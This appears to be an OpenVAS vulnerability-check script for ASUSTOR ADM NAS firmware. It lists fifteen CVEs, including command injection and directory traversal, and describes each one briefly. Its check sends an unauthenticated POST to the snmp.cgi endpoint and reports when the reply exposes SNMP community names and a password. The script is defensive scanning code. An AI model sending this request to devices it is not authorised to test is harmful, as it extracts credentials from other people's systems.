##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_asustor_adm_mult_vuln.nasl 13783 2019-02-20 11:12:24Z cfischer $
#
# ASUSTOR ADM < 3.1.3.RHU2 Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/h:asustor:adm_firmware";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141755");
  script_version("$Revision: 13783 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-20 12:12:24 +0100 (Wed, 20 Feb 2019) $");
  script_tag(name:"creation_date", value:"2018-12-05 10:58:25 +0700 (Wed, 05 Dec 2018)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2018-12305", "CVE-2018-12306", "CVE-2018-12307", "CVE-2018-12308", "CVE-2018-12309",
                "CVE-2018-12310", "CVE-2018-12311", "CVE-2018-12312", "CVE-2018-12313", "CVE-2018-12314",
                "CVE-2018-12315", "CVE-2018-12316", "CVE-2018-12317", "CVE-2018-12318", "CVE-2018-12319");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("ASUSTOR ADM < 3.1.3.RHU2 Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_asustor_adm_detect.nasl");
  script_mandatory_keys("asustor_adm/detected");

  script_tag(name:"summary", value:"ASUSTOR ADM is prone to multiple vulnerabilities.");

  script_tag(name:"insight", value:"ASUSTOR ADM is prone to multiple vulnerabilities:

  - Cross-Site Scripting via SVG Images (CVE-2018-12305)

  - Directory Traversal via download.cgi (CVE-2018-12306)

  - Command Injection in user.cgi (CVE-2018-12307)

  - Shared Folder Encryption Key Sent as URL Parameter (CVE-2018-12308)

  - Directory Traversal via upload.cgi (CVE-2018-12309)

  - Cross-Site Scripting on Login page (CVE-2018-12310)

  - Missing Input Sanitization on File Explorer filenames (CVE-2018-12311)

  - Missing Input Sanitization on File Explorer filenames (CVE-2018-12311)

  - Unauthenticated Command Injection in SNMP API (CVE-2018-12313)

  - Directory Traversal via downloadwallpaper.cgi (CVE-2018-12314)

  - Password Change Does Not Require Existing Password (CVE-2018-12315)

  - Command Injection in upload.cgi (CVE-2018-12316)

  - Command Injection in group.cgi (CVE-2018-12317)

  - snmp.cgi Returns Password in Cleartext (CVE-2018-12318)

  - Login Denial of Service (CVE-2018-12319)");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"affected", value:"ASUSTOR ADM prior to 3.1.3.RHU2.");

  script_tag(name:"solution", value:"Update to version 3.1.3.RHU2 or later.");

  script_xref(name:"URL", value:"https://blog.securityevaluators.com/unauthenticated-remote-code-execution-in-asustor-as-602t-2d806c30dcea");
  script_xref(name:"URL", value:"https://blog.securityevaluators.com/over-a-dozen-vulnerabilities-discovered-in-asustor-as-602t-8dd5832a82cc");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/portal/apis/services/snmp.cgi?act=get&tab=Get&_dc=1530552418588";

headers = make_array("X-Requested-With", "XMLHttpRequest",
                     "Content-Length",   "0");

req = http_post_req( port: port, url: url, add_headers: headers);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if ('"success": true' >< res && '"passwd":' >< res) {
  report = 'It was possible to obtain the SNMP settings including the community names and password.' +
           '\n\nResult:\n' + res;
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
